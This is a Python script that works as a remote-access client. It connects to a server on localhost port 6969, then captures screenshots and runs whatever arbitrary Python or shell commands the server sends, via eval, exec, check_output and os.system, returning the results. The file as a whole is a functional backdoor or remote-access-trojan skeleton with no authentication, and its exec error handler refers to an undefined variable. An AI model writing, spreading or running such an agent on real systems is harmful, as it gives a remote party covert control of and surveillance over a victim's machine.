import socket as s
con2 = 'localhost', 6969

from mss import mss
from PIL import Image
from io import BytesIO
sct = {}
def ss(soc):
    resizeRatio = soc.recv(1)[0]
    if not sct:
        sct['sct'] = mss()
        sct['mon'] = sct['sct'].monitors[0]
    img = sct['sct'].grab(sct['mon'])
    size = round(img.width/resizeRatio), round(img.height/resizeRatio)
    img = Image.frombytes('RGB', img.size, img.bgra, 'raw', 'BGRX')
    img = img.resize(size)
    bs = BytesIO()
    img.save(bs, format='jpeg')
    bs = bs.getbuffer().tobytes()
    soc.sendall(len(bs).to_bytes(length=3, byteorder='big'))
    soc.sendall(bs)

def recvstring(soc):
    s = soc.recv(int.from_bytes(soc.recv(2), byteorder='big')).decode('utf-16')
    print('Recieved string:', s)
    return s

def senderror(exc, soc):
    exc = str(exc)
    print('Exception occured: ' + exc)
    exc = exc.encode('utf-16')
    soc.sendall(len(exc).to_bytes(length=2, byteorder='big'))
    soc.sendall(exc)

with s.socket(s.AF_INET, s.SOCK_STREAM) as sock:
    sock.connect(con2)
    print('Connected to server')

    while True:
        ch = sock.recv(1)[0]
        print('Recieved: ' + str(ch))
        # 0: ss, 1: eval, 2: exec, 3: check_output, 4: os.system
        if ch==0:
            try:
                ss(sock)
            except Exception as exc:
                sock.sendall(b'\xff\xff\xff')
                senderror(exc, sock)
        elif ch==1:
            bs, leng, lenleng = None, None, None
            try:
                bs = eval(recvstring(sock))
                from pickle import dumps
                bs = dumps(bs)
                leng = len(bs)
                lenleng = (leng.bit_length() + 7) // 8
                leng = leng.to_bytes(length=lenleng, byteorder='big')
                lenleng = bytes((lenleng,))
            except Exception as exc:
                sock.sendall(b'\xff')
                senderror(exc, sock)
            else:
                sock.sendall(b'\x00')
            sock.sendall(lenleng)
            sock.sendall(leng)
            sock.sendall(bs)
        elif ch==2:
            try:
                exec(recvstring(sock))
                sock.sendall(b'\x00') # no error!
            except Exception as e:
                sock.sendall(b'\xff')
                senderror(exc, sock)
        elif ch==3:
            from subprocess import check_output
            try:
                bs = check_output(recvstring(sock))
                leng = len(bs)
                lenleng = (leng.bit_length() + 7) // 8
                leng = leng.to_bytes(length=lenleng, byteorder='big')
                lenleng = bytes((lenleng,))
                sock.sendall(b'\x00')
                sock.sendall(lenleng)
                sock.sendall(leng)
                sock.sendall(bs)
            except Exception as exc:
                sock.sendall(b'\xff')
                senderror(exc, sock)
        elif ch==4:
            try:
                import os
                os.system(recvstring(sock))
                sock.sendall(b'\x00')
            except Exception as exc:
                sock.sendall(b'\xff')
                senderror(exc, sock)
        else:
            print('ch!=0|1|2|3|4')